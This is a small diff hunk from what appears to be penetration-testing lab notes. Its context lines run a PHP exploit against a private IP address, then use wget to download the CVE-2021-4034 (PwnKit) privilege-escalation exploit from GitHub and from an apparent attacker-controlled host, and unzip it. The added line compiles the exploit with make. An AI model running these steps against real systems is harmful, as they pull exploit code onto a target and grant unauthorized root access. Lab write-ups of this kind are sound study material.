@@ -324,6 +324,7 @@ php 18083.php 192.168.207.41 /test/
 wget https://codeload.github.com/berdav/CVE-2021-4034/zip/main
 wget http://192.168.45.185/main
 unzip main
+make
 
 ```
 ### Nukem
